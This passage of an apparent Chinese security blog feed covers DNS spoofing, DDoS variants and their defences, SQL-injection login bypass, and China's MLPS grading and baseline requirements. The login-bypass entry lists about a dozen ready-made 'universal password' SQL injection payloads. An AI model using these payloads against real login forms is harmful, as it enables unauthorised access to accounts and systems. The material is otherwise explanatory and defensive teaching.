href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%99%A8/9705133" target="_blank" rel="noopener">域名服务器</a>的一种欺骗行为。<br>原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了</p><h1 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h1><p>原理：利用合理的请求造成资源过载，导致服务不可用</p><h2 id="网络层DDOS"><a href="#网络层DDOS" class="headerlink" title="网络层DDOS"></a>网络层DDOS</h2><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>目前主流的DDoS攻击方式主要包括：</p><p>传统攻击：ICMP Flood、UDP Flood、SYN Flood、HTTP Flood等；</p><p>反射放大攻击：NTP Flood、SSDP Flood、DNS Flood等；</p><p>以及根据攻击目标的特点进行的有针对性的混合攻击。 </p><h3 id="SYN-Flood攻击"><a href="#SYN-Flood攻击" class="headerlink" title="SYN Flood攻击"></a>SYN Flood攻击</h3><p>SYN Flood是一种最为经典的DDOS攻击，SYN Flood利用了TCP协议的缺陷</p><h5 id="TCP三次握手过程："><a href="#TCP三次握手过程：" class="headerlink" title="TCP三次握手过程："></a>TCP三次握手过程：</h5><p>客户端向服务端发送一个SYN包</p><p>服务器端收到后，向客户端发送一个SYN+ACK包</p><p>客户端收到后，向服务端返回一个ACK确认包</p><h5 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h5><p>SYN Flood攻击，首先伪造大量的源IP地址，分别向服务端发送大量的SYN 包，服务器返回确认包，因为源地址是伪造的，所以伪造的IP不会应答，服务端会重试，超时后丢弃这个链接。攻击者大量发送这种伪造的SYN请求，服务端将会消耗非常多的资源来处理这种半连接，无法顾及正常的连接请求，导致拒绝服务。</p><h5 id="防御对抗"><a href="#防御对抗" class="headerlink" title="防御对抗"></a>防御对抗</h5><p>SYN cookie/SYN proxy</p><p>加大带宽，与运营商合作、进行流量清洗</p><h2 id="应用层DDOS"><a href="#应用层DDOS" class="headerlink" title="应用层DDOS"></a>应用层DDOS</h2><h4 id="CC攻击"><a href="#CC攻击" class="headerlink" title="CC攻击"></a>CC攻击</h4><p>为挑战绿盟的黑洞反DDOS设备，而命名</p><p>攻击原理很简单，就是对一些消耗资源大的应用页面不断发起正常的请求，以达到消耗服务器资源的目的。</p><p>防御：</p><p>在应用中限制每个客户端的请求频率，在网络架构上做好优化</p><h4 id="防御应用层DDOS"><a href="#防御应用层DDOS" class="headerlink" title="防御应用层DDOS"></a>防御应用层DDOS</h4><p>在Apache配置中，可以调小Timeout、KeepAliveTimeout值，增大MaxClients值</p><p>验证码 </p><p>限制单个IP的访问频率</p><h4 id="慢速攻击slowloris"><a href="#慢速攻击slowloris" class="headerlink" title="慢速攻击slowloris"></a>慢速攻击slowloris</h4><h5 id="原理-15"><a href="#原理-15" class="headerlink" title="原理"></a>原理</h5><p>以极低的速度往服务器发送HTTP请求，由于web  server的所有连接都将被恶意连接占用（构造畸形的HTTP请求），从而无法接受新的请求，导致拒绝服务。本质是对有限资源 的无限制滥用</p><h5 id="防御-16"><a href="#防御-16" class="headerlink" title="防御"></a>防御</h5><p>调大MaxClient值</p><h4 id="HTTP-POST-DOS"><a href="#HTTP-POST-DOS" class="headerlink" title="HTTP  POST  DOS"></a>HTTP  POST  DOS</h4><h5 id="原理-16"><a href="#原理-16" class="headerlink" title="原理"></a>原理</h5><p>在发送post包时，指定一个非常大的Content-Length值，然后以很低的速度发包，保持住这个连接不断开，这样当客户端连接数多了以后，占住所有的可用连接，从而导致DOS</p><h5 id="防御-17"><a href="#防御-17" class="headerlink" title="防御"></a>防御</h5><p>调大MaxCLient值</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>万能密码原理</title>
    <link href="http://yoursite.com/2018/09/04/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2018/09/04/万能密码原理/</id>
    <published>2018-09-04T05:33:05.000Z</published>
    <updated>2018-09-04T06:28:38.659Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-214.png" alt="upload successful"></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>用户进行用户名和密码验证时，网站需要查询数据库，查询数据库就是执行SQL语句。</p><p>当用户登录时，后台执行的数据库查询操作（SQL语句），如<code>select  user  from  users   where  use_id =&#39;用户名&#39; and   password = ‘密码’</code></p><p>由于网站在进行数据库查询时没有过滤，当输入用户名admin和万能密码 <code>2‘ or ’ 1</code> 。执行的SQL语句为<code>select  user  from  users   where  use_id = &#39;admin&#39;  and   password = ‘ 2 &#39; or &#39; 1’</code> 。同时SQL语句中逻辑运算符具有优先级，=优先于 and，and优先于 or ，且适用传递性，因此，此SQL语句在后台解析时，分成两句：<code>select  user  from  users   where  use_id = &#39;admin&#39;  and   password = ‘ 2 &#39;  和  &#39; 1’</code>，两句bool值进行逻辑or运算，恒为TRUE，SQL查询语句查询结果为TRUE，就意味着认证成功，也可以登录到系统中。</p><h2 id="常见万能密码"><a href="#常见万能密码" class="headerlink" title="常见万能密码"></a>常见万能密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">&apos;)or(&apos;a&apos;=&apos;a</span><br><span class="line">or 1=1--</span><br><span class="line">&apos;or 1=1--</span><br><span class="line">a&apos;or&apos; 1=1--</span><br><span class="line">&quot;or 1=1--</span><br><span class="line">&apos;or&apos;a&apos;=&apos;a</span><br><span class="line">&quot;or&quot;=&quot;a&apos;=&apos;a</span><br><span class="line">&apos;or&apos;&apos;=&apos;</span><br><span class="line">1&apos;or&apos;=&apos;or&apos;</span><br><span class="line">1 or &apos;1&apos;=&apos;1&apos;=1</span><br><span class="line">1 or &apos;1&apos;=&apos;1&apos; or 1=1</span><br><span class="line">&apos;OR 1=1%00</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>等保定级</title>
    <link href="http://yoursite.com/2018/09/03/%E7%AD%89%E4%BF%9D/"/>
    <id>http://yoursite.com/2018/09/03/等保/</id>
    <published>2018-09-03T07:53:29.000Z</published>
    <updated>2018-09-03T07:54:48.627Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-210.png" alt="upload successful"></p><h2 id="术语和定义"><a href="#术语和定义" class="headerlink" title="术语和定义"></a>术语和定义</h2><h4 id="等级保护对象"><a href="#等级保护对象" class="headerlink" title="等级保护对象"></a>等级保护对象</h4><p>网络安全等级保护的保护对象，主要包括基础信息网络、信息系统（诸如传统信息系统、工业控制系统、云计算平台、物联网、使用移动互联技术的信息系统等）和大数据等。</p><h4 id="基础信息网络"><a href="#基础信息网络" class="headerlink" title="基础信息网络"></a>基础信息网络</h4><p>为信息流通、信息系统运行等起基础支撑作用的信息网络，包括电信网、广播电视传输网、互联网、业务专网等网络设备设施。</p><h4 id="信息系统"><a href="#信息系统" class="headerlink" title="信息系统"></a>信息系统</h4><p>由计算机和类计算机的软硬件及其相关的和配套的设备、设施构成的，按照一定的应用目标和规则进行信息处理或过程控制的资源集合。<br>注： 资源可以是物理设备，也可以是虚拟设备。</p><h4 id="国家关键信息基础设施"><a href="#国家关键信息基础设施" class="headerlink" title="国家关键信息基础设施"></a>国家关键信息基础设施</h4><p>关系到国家核心利益、人民群众生命财产安全和社会生产生活秩序，一旦遭到破坏、丧失功能或数据泄露，可能严重危害国家安全、国计民生和公共利益的基础信息网络、重要业务系统和生产控制系统以及重要数据资源等。</p><h4 id="客体"><a href="#客体" class="headerlink" title="客体"></a>客体</h4><p>受法律保护的、等级保护对象受到破坏时所侵害的社会关系，如国家安全、社会秩序、公共利益以及公民、法人或其他组织的合法权益。</p><h4 id="客观方面"><a href="#客观方面" class="headerlink" title="客观方面"></a>客观方面</h4><p>对客体造成侵害的客观外在表现，包括侵害方式和侵害结果等。</p><h2 id="安全保护等级"><a href="#安全保护等级" class="headerlink" title="安全保护等级"></a>安全保护等级</h2><p>根据等级保护相关管理文件，等级保护对象的安全保护等级分为以下五级：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一级，等级保护对象受到破坏后，会对公民、法人和其他组织的合法权益造成损害，但不损害国家安全、社会秩序和公共利益。</span><br><span class="line"></span><br><span class="line">第二级，等级保护对象受到破坏后，会对公民、法人和其他组织的合法权益产生严重损害，或者对社会秩序和公共利益造成损害，但不损害国家安全。</span><br><span class="line"></span><br><span class="line">第三级，等级保护对象受到破坏后，会对公民、法人和其他组织的合法权益产生特别严重损害，或者对社会秩序和公共利益造成严重损害，或者对国家安全造成损害。</span><br><span class="line"></span><br><span class="line">第四级，等级保护对象受到破坏后，会对社会秩序和公共利益造成特别严重损害，或者对国家安全造成严重损害。</span><br><span class="line"></span><br><span class="line">第五级，等级保护对象受到破坏后，会对国家安全造成特别严重损害。</span><br></pre></td></tr></table></figure></p><h2 id="定级要素"><a href="#定级要素" class="headerlink" title="定级要素"></a>定级要素</h2><h4 id="受侵害的客体"><a href="#受侵害的客体" class="headerlink" title="受侵害的客体"></a>受侵害的客体</h4><p>等级保护对象受到破坏时所侵害的客体包括以下三个方面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a) 公民、法人和其他组织的合法权益</span><br><span class="line">b) 社会秩序、公共利益</span><br><span class="line">c) 国家安全</span><br></pre></td></tr></table></figure></p><h4 id="对客体的侵害程度"><a href="#对客体的侵害程度" class="headerlink" title="对客体的侵害程度"></a>对客体的侵害程度</h4><p> 对客体的侵害外在表现为对等级保护对象的破坏，通过危害方式、危害后果和危害程度加以描述。<br>等级保护对象受到破坏后对客体造成侵害的程度归结为以下三种：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a) 造成一般损害</span><br><span class="line">b) 造成严重损害</span><br><span class="line">c) 造成特别严重损害</span><br></pre></td></tr></table></figure></p><p>三种侵害程度的描述如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">——一般损害：工作职能受到局部影响，业务能力有所降低但不影响主要功能的执行，出现较轻的法律问题，较低的财产损失，有限的社会不良影响，对其他组织和个人造成较低损害。</span><br><span class="line"></span><br><span class="line">——严重损害：工作职能受到严重影响，业务能力显著下降且严重影响主要功能执行，出现较严重的法律问题，较高的财产损失，较大范围的社会不良影响，对其他组织和个人造成较严重损害。</span><br><span class="line"></span><br><span class="line">——特别严重损害：工作职能受到特别严重影响或丧失行使能力，业务能力严重下降且或功能无法执行，出现极其严重的法律问题，极高的财产损失，大范围的社会不良影响，对其他组织和个人造成非常严重损害。</span><br></pre></td></tr></table></figure></p><h4 id="定级流程"><a href="#定级流程" class="headerlink" title="定级流程"></a>定级流程</h4><p>等级保护对象定级的一般流程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a) 确定定级对象；</span><br><span class="line">b) 初步确定等级；</span><br><span class="line">c) 专家评审；</span><br><span class="line">d) 主管部门审核；</span><br><span class="line">e) 公安机关备案审查。</span><br></pre></td></tr></table></figure></p><h2 id="确定安全保护等级"><a href="#确定安全保护等级" class="headerlink" title="确定安全保护等级"></a>确定安全保护等级</h2><p>根据业务信息安全被破坏时所侵害的客体以及对相应客体的侵害程度，依据业务信息安全保护 等级矩阵表，可得到业务信息安全保护等级。  </p><h4 id="业务信息安全保护等级矩阵表"><a href="#业务信息安全保护等级矩阵表" class="headerlink" title="业务信息安全保护等级矩阵表"></a>业务信息安全保护等级矩阵表</h4><p><img src="\images\pasted-211.png" alt="upload successful"></p><p>根据系统服务安全被破坏时所侵害的客体以及对相应客体的侵害程度，依据系统服务安全保护等级矩阵表，即可得到系统服务安全保护等级。</p><h4 id="系统服务安全保护等级矩阵表"><a href="#系统服务安全保护等级矩阵表" class="headerlink" title="系统服务安全保护等级矩阵表"></a>系统服务安全保护等级矩阵表</h4><p><img src="\images\pasted-212.png" alt="upload successful"></p><p>定级对象的安全保护等级由业务信息安全保护等级和系统服务安全保护等级的较高者决定。    </p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全等级保护" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/"/>
    
    
      <category term="安全等级保护" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>等保-安全通用要求</title>
    <link href="http://yoursite.com/2018/09/03/%E7%AD%89%E4%BF%9D-%E5%AE%89%E5%85%A8%E9%80%9A%E7%94%A8%E8%A6%81%E6%B1%82/"/>
    <id>http://yoursite.com/2018/09/03/等保-安全通用要求/</id>
    <published>2018-09-03T07:53:29.000Z</published>
    <updated>2018-09-03T09:19:21.318Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-213.png" alt="upload successful"></p><h1 id="不同等级的安全保护对象"><a href="#不同等级的安全保护对象" class="headerlink" title="不同等级的安全保护对象"></a>不同等级的安全保护对象</h1><p>安全等级保护对象是指等级保护工作中的保护对象，主要包括网络基础设施、信息系统、大数据、云计算平台、物联网、工控系统等； 安全等级保护对象根据其在国家安全、经济建设、社会生活中的重要程度，遭到破坏后对国家安全、社会秩序、公共利益以及公民、法人和其他组织的合法权益的危害程度等，由低到高划分为五级:</p><p>第一级，等级保护对象受到破坏后，会对公民、法人和其他组织的合法权益造成损害，但不损害国家安全、社会秩序和公共利益。</p><p>第二级，等级保护对象受到破坏后，会对公民、法人和其他组织的合法权益产生严重损害，或者对社会秩序和公共利益造成损害，但不损害国家安全。</p><p>第三级，等级保护对象受到破坏后，会对公民、法人和其他组织的合法权益产生特别严重损害，或者对社会秩序和公共利益造成严重损害，或者对国家安全造成损害。</p><p>第四级，等级保护对象受到破坏后，会对社会秩序和公共利益造成特别严重损害，或者对国家安全造成严重损害。</p><p>第五级，等级保护对象受到破坏后，会对国家安全造成特别严重损害。</p><h4 id="安全保护等级如表："><a href="#安全保护等级如表：" class="headerlink" title="安全保护等级如表："></a>安全保护等级如表：</h4><h1 id="不同等级的安全保护能力"><a href="#不同等级的安全保护能力" class="headerlink" title="不同等级的安全保护能力"></a>不同等级的安全保护能力</h1><p>不同等级的保护对象应具备的基本安全保护能力如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一级安全保护能力：应能够防护免受来自个人的、拥有很少资源的威胁源发起的恶意攻击、 一般的自然灾难、 以及其他相当危害程度的威胁所造成的关键资源损害，在自身遭到损害后，能够恢复部分功能。</span><br><span class="line"></span><br><span class="line">第二级安全保护能力：应能够防护免受来自外部小型组织的、拥有少量资源的威胁源发起的恶意攻击、 一般的自然灾难、 以及其他相当危害程度的威胁所造成的重要资源损害，能够发现重要的安全漏洞和安全事件，在自身遭到损害后，能够在一段时间内恢复部分功能。</span><br><span class="line"></span><br><span class="line">第三级安全保护能力：应能够在统一安全策略下防护免受来自外部有组织的团体、 拥有较为丰富资源的威胁源发起的恶意攻击、 较为严重的自然灾难、 以及其他相当危害程度的威胁所造成的主要资源损害，能够发现安全漏洞和安全事件，在自身遭到损害后，能够较快恢复绝大部分功能。</span><br><span class="line"></span><br><span class="line">第四级安全保护能力：应能够在统一安全策略下防护免受来自国家级别的、敌对组织的、拥有丰富资源的威胁源发起的恶意攻击、 严重的自然灾难、 以及其他相当危害程度的威胁所造成的资源损害，能够发现安全漏洞和安全事件，在自身遭到损害后，能够迅速恢复所有功能。</span><br><span class="line"></span><br><span class="line">第五级安全保护能力：（略）。</span><br></pre></td></tr></table></figure></p><h1 id="第一级安全要求"><a href="#第一级安全要求" class="headerlink" title="第一级安全要求"></a>第一级安全要求</h1><h3 id="技术要求"><a href="#技术要求" class="headerlink" title="技术要求"></a>技术要求</h3><h4 id="物理和环境安全"><a href="#物理和环境安全" class="headerlink" title="物理和环境安全"></a>物理和环境安全</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">物理访问控制：</span><br><span class="line">机房出入口应安排专人值守或配置电子门禁系统，控制、鉴别和记录进入的人员。</span><br><span class="line"></span><br><span class="line">防盗窃和防破坏:</span><br><span class="line">应将机房设备或主要部件进行固定，并设置明显的不易除去的标记。</span><br><span class="line"></span><br><span class="line">防雷击:</span><br><span class="line">应将各类机柜、设施和设备等通过接地系统安全接地。</span><br><span class="line"></span><br><span class="line">防火:</span><br><span class="line">机房应设置灭火设备。  </span><br><span class="line"></span><br><span class="line">防水和防潮:</span><br><span class="line">应采取措施防止雨水通过机房窗户、屋顶和墙壁渗透。</span><br><span class="line"></span><br><span class="line">温湿度控制:</span><br><span class="line">机房应设置必要的温、湿度控制设施，使机房温、湿度的变化在设备运行所允许的范围之内。</span><br><span class="line"></span><br><span class="line">电力供应:</span><br><span class="line">应在机房供电线路上配置稳压器和过电压防护设备。</span><br></pre></td></tr></table></figure><h4 id="网络和通信安全"><a href="#网络和通信安全" class="headerlink" title="网络和通信安全"></a>网络和通信安全</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">网络架构要求包括:</span><br><span class="line">a) 应保证网络设备的业务处理能力满足基本业务需要；</span><br><span class="line">b) 应保证接入网络和核心网络的带宽满足基本业务需要。</span><br><span class="line"></span><br><span class="line">通信传输:</span><br><span class="line">应采用校验码技术保证通信过程中数据的完整性。</span><br><span class="line"></span><br><span class="line">边界防护:</span><br><span class="line">应保证跨越边界的访问和数据流通过边界防护设备提供的受控接口进行通信。</span><br><span class="line"></span><br><span class="line">访问控制要求包括：</span><br><span class="line">a) 应在网络边界根据访问控制策略设置访问控制规则，默认情况下除允许通信外受控接口拒绝所</span><br><span class="line">有通信；</span><br><span class="line">b) 应删除多余或无效的访问控制规则，优化访问控制列表，并保证访问控制规则数量最小化；</span><br><span class="line">c) 应对源地址、目的地址、源端口、目的端口和协议等进行检查，以允许/拒绝数据包进出。</span><br></pre></td></tr></table></figure><h4 id="设备和计算安全"><a href="#设备和计算安全" class="headerlink" title="设备和计算安全"></a>设备和计算安全</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> 身份鉴别要求包括：</span><br><span class="line">a) 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并</span><br><span class="line">定期更换；</span><br><span class="line">b) 应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动</span><br><span class="line">退出等相关措施。</span><br><span class="line"></span><br><span class="line">访问控制要求包括：</span><br><span class="line">a) 应对登录的用户分配账号和权限；</span><br><span class="line">b) 应重命名默认账号或修改默认口令；</span><br><span class="line">c) 应及时删除或停用多余的、过期的账号，避免共享账号的存在。</span><br><span class="line"></span><br><span class="line">入侵防范要求包括：</span><br><span class="line">a) 系统应遵循最小安装的原则，仅安装需要的组件和应用程序；</span><br><span class="line">b) 应关闭不需要的系统服务、默认共享和高危端口。</span><br><span class="line"></span><br><span class="line">恶意代码防范：</span><br><span class="line">应安装防恶意代码软件或配置具有相应功能的软件，并定期进行升级和更新防恶意代码库。</span><br></pre></td></tr></table></figure><h4 id="应用和数据安全"><a href="#应用和数据安全" class="headerlink" title="应用和数据安全"></a>应用和数据安全</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">身份鉴别要求包括：</span><br><span class="line">a) 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，鉴别信息具有复杂度要求并定期</span><br><span class="line">更换；</span><br><span class="line">b) 应提供并启用登录失败处理功能，多次登录失败后应采取必要的保护措施。</span><br><span class="line"></span><br><span class="line">访问控制要求包括：</span><br><span class="line">a) 应提供访问控制功能，对登录的用户分配账号和权限；</span><br><span class="line">b) 应重命名应用系统默认账号或修改这些账号的默认口令；</span><br><span class="line">c) 应及时删除或停用多余的、过期的账号，避免共享账号的存在。</span><br><span class="line"></span><br><span class="line">软件容错：</span><br><span class="line">应提供数据有效性检验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求</span><br><span class="line"></span><br><span class="line">数据完整性：</span><br><span class="line">应采用校验码技术保证重要数据在传输过程中的完整性。</span><br><span class="line"></span><br><span class="line">数据备份恢复：</span><br><span class="line">应提供重要数据的本地数据备份与恢复功能</span><br></pre></td></tr></table></figure><h3 id="管理要求"><a href="#管理要求" class="headerlink" title="管理要求"></a>管理要求</h3><h4 id="安全策略和管理制度"><a href="#安全策略和管理制度" class="headerlink" title="安全策略和管理制度"></a>安全策略和管理制度</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">管理制度：</span><br><span class="line"></span><br><span class="line">应建立日常管理活动中常用的安全管理制度。</span><br></pre></td></tr></table></figure><h4 id="安全管理机构和人员"><a href="#安全管理机构和人员" class="headerlink" title="安全管理机构和人员"></a>安全管理机构和人员</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">岗位设置：</span><br><span class="line">应设立系统管理员、网络管理员、安全管理员等岗位，并定义各个工作岗位的职责。</span><br><span class="line"></span><br><span class="line">人员配备：</span><br><span class="line">应配备一定数量的系统管理员、网络管理员、安全管理员等。</span><br><span class="line"></span><br><span class="line">授权和审批：</span><br><span class="line"></span><br><span class="line">应根据各个部门和岗位的职责明确授权审批事项、审批部门和批准人等。</span><br><span class="line"></span><br><span class="line">人员录用：</span><br><span class="line">应指定或授权专门的部门或人员负责人员录用。</span><br><span class="line"></span><br><span class="line">人员离岗：</span><br><span class="line">应及时终止离岗员工的所有访问权限，取回各种身份证件、钥匙、徽章等以及机构提供的软硬件设备</span><br><span class="line"></span><br><span class="line">安全意识教育和培训：</span><br><span class="line">应对各类人员进行安全意识教育和岗位技能培训，并告知相关的安全责任和惩戒措施。</span><br><span class="line"></span><br><span class="line">外部人员访问管理：</span><br><span class="line">应确保在外部人员访问受控区域前得到授权或审批。</span><br></pre></td></tr></table></figure><h4 id="安全建设管理"><a href="#安全建设管理" class="headerlink" title="安全建设管理"></a>安全建设管理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">定级：</span><br><span class="line">应明确保护对象的边界和安全保护等级。</span><br><span class="line"></span><br><span class="line">安全方案设计：</span><br><span class="line">应根据安全保护等级选择基本安全措施，依据风险分析的结果补充和调整安全措施。</span><br><span class="line"></span><br><span class="line">产品采购和使用：</span><br><span class="line">应确保信息安全产品采购和使用符合国家的有关规定。</span><br><span class="line"></span><br><span class="line">工程实施：</span><br><span class="line">应指定或授权专门的部门或人员负责工程实施过程的管理。</span><br><span class="line"></span><br><span class="line">测试验收：</span><br><span class="line">应进行安全性测试验收。</span><br><span class="line"></span><br><span class="line">系统交付：</span><br><span class="line">a) 应根据交付清单对所交接的设备、软件和文档等进行清点；</span><br><span class="line">b) 应对负责运行维护的技术人员进行相应的技能培训。</span><br><span class="line"></span><br><span class="line">服务供应商选择：</span><br><span class="line">a) 应确保服务供应商的选择符合国家的有关规定；</span><br><span class="line">b) 应与选定的服务供应商签订与安全相关的协议，明确约定相关责任。</span><br></pre></td></tr></table></figure><h4 id="安全运维管理"><a href="#安全运维管理" class="headerlink" title="安全运维管理"></a>安全运维管理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">环境管理：</span><br><span class="line">a) 应指定专门的部门或人员负责机房安全，对机房出入进行管理，定期对机房供配电、空调、温湿度控制、消防等设施进行维护管理；</span><br><span class="line">b) 应建立机房安全管理制度，对有关机房物理访问，物品带进、带出机房和机房环境安全等方面的管理作出规定。</span><br><span class="line"></span><br><span class="line">介质管理 :</span><br><span class="line"></span><br><span class="line">应确保介质存放在安全的环境中，对各类介质进行控制和保护，实行存储环境专人管理，并根据存档介质的目录清单定期盘点。</span><br><span class="line"></span><br><span class="line">设备维护管理：</span><br><span class="line"></span><br><span class="line">应对各种设备（包括备份和冗余设备）、线路等指定专门的部门或人员定期进行维护管理。</span><br><span class="line"></span><br><span class="line">漏洞和风险管理：</span><br><span class="line">应采取必要的措施识别安全漏洞和隐患，对发现的安全漏洞和隐患及时进行修补或评估可能的影响后进行修补。</span><br><span class="line"></span><br><span class="line">网络和系统安全管理：</span><br><span class="line">a) 应划分不同的管理员角色进行网络和系统的运维管理，明确各个角色的责任和权限；</span><br><span class="line">b) 